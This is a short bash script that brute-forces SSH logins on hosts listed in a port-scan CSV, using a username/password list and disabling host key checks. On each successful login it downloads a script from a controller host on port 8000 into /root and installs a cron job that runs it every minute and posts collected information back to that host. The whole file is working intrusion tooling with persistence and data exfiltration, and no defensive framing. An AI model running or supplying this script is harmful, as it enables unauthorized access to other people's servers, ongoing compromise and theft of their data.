#!/bin/bash

ports_csv="open_ports.csv"
userpass_csv="userpass.csv"

command1="curl http://$1:8000/source/getscript/ > /root/gatherinfo.sh"
command2='(crontab -l ; echo "*/1     *       *       *       *       source /root/gatherinfo.sh http://'"$1"':8000/panel/postinfo/") | crontab -'

while IFS=',' read -r line
do
    ip=$(echo "$line" | cut -d',' -f1 | sed 's/[()]//g')
    port=$(echo "$line" | cut -d',' -f2 | cut -d'/' -f1)

    if [ $port = "22" ]
    then
        echo "brutforcing ssh on $ip:$port"
        stat="0"
        while IFS=',' read -r username password
        do
            sshpass -p "$password" ssh -oStrictHostKeyChecking=no -p "$port" "$username"@"$ip" "$command1 && $command2" 2> /dev/null
            if [ $? = "0" ]
            then
                stat="1"
                echo "SUCCESS| $username:$password"
            fi
        done < "$userpass_csv"
        if [ $stat = "0" ]
        then
            echo "FAILED"
        fi
    fi
done < "$ports_csv"
